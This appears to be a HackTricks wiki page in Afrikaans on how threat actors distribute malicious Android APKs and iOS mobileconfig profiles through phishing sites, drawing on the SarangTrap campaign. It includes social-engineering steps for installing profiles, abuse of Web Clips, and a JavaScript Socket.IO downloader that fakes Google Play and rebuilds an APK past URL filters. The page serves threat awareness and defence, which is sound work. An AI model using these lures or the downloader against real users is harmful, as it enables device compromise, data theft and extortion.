# Mobiele uitvissing en verspreiding van kwaadwillige apps (Android en iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Hierdie bladsy dek tegnieke wat bedreigingsakteurs gebruik om **kwaadwillige Android-APK’s** en **iOS-mobielekonfigurasieprofiele** deur uitvissing te versprei (SEO, sosiale manipulasie, vals winkels, dating-apps, ens.).
> Die materiaal is aangepas uit die SarangTrap-veldtog wat Zimperium zLabs in 2025 blootgelê het, en ander openbare navorsing.<sup>[[1]](#references)</sup>

## Aanvalsvloei

1. **SEO-/uitvissingsinfrastruktuur**
   * Registreer dosyne domeine wat soos egte domeine lyk (dating, wolkdeling, motordiens…).  
     – Gebruik sleutelwoorde in plaaslike tale en emoji’s in die `<title>`-element om hoër in Google-resultate te rangskik.  
     – Bied *beide* Android- (`.apk`) en iOS-installasie-instruksies op dieselfde bestemmingsbladsy aan.
2. **Eerste-fase-aflaai**
   * Android: direkte skakel na ’n *ongtekende* APK of een van ’n “third-party store”.  
   * iOS: `itms-services://`- of gewone HTTPS-skakel na ’n kwaadwillige **mobileconfig**-profiel (sien hieronder).
3. **Android-gedrag ná installasie**
   * C2-beheerde uitvoering, misbruik van toestemmings, omseiling van dropper-beskerming, versameling in die agtergrond en ander gedrag van wanware ná installasie word op die toegewyde Android Malware Post-Exploitation-bladsy hieronder bespreek.
4. **iOS-afleweringstegniek**
   * ’n Enkele **mobielekonfigurasieprofiel** kan `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, ens. aanvra om die toestel by “MDM”-agtige toesig in te skryf.  
   * Instruksies vir sosiale manipulasie:
     1. Maak Settings oop ➜ *Profile downloaded*.
     2. Tik drie keer op *Install* (skermkiekies verskyn op die uitvissingsbladsy).  
     3. Vertrou die ongetekende profiel ➜ die aanvaller kry die *Contacts*- en *Photo*-regte sonder App Store-oorsig.
5. **iOS Web Clip-looisagteware (ikoon van ’n uitvissing-app)**
   * `com.apple.webClip.managed`-payloads kan ’n uitvissings-URL met ’n handelsmerkikoon/-etiket **aan die tuisskerm vaspen**.
   * Web Clips kan **volskerm** loop (verberg die blaaierkoppelvlak) en as **nie-verwyderbaar** gemerk word, wat die slagoffer dwing om die profiel te verwyder om die ikoon te verwyder.<sup>[[3]](#references)</sup>
6. **Netwerklaag**
   * Gewone HTTP, dikwels op poort 80, met ’n HOST-opskrif soos `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (geen TLS → maklik om raak te sien).

## Android-wanware ná uitbuiting

Vir Android-wanwaretegnieke ná installasie, soos C2, misbruik van Accessibility, oorleggings, ATS-outomatisering, gefaseerde DEX-laai, premium SMS en volharding, sien:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK-smokkelary met Socket.IO/WebSocket en vals Google Play-bladsye

Aanvallers vervang toenemend statiese APK-skakels met ’n Socket.IO/WebSocket-kanaal wat in lokmiddels ingebed is wat soos Google Play lyk. Dit verberg die payload-URL, omseil URL-/uitbreidingsfilters en behou ’n realistiese installasie-ervaring.<sup>[[2]](#references)[[4]](#references)</sup>

Tipiese kliëntvloei wat in die praktyk waargeneem is:

<details>
<summary>Socket.IO-aflaaier wat Google Play naboots (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Waarom dit eenvoudige beheermaatreëls ontduik:
- Geen statiese APK-URL word blootgestel nie; die payload word in die geheue uit WebSocket-rame gerekonstrueer.
- URL-/MIME-/uitbreidingsfilters wat direkte .apk-antwoorde blokkeer, kan binêre data miskyk wat via WebSockets/Socket.IO getonnel word.
- Crawlers en URL-sandboxes wat nie WebSockets uitvoer nie, sal nie die payload ophaal nie.

Sien ook WebSocket tradecraft en gereedskap:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Die donker kant van romanse: SarangTrap-afpersingsveldtog](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Web Clips-payloadinstellings vir Apple-toestelle](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Bankertrojaan teiken Indonesiese en Viëtnamese Android-gebruikers](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
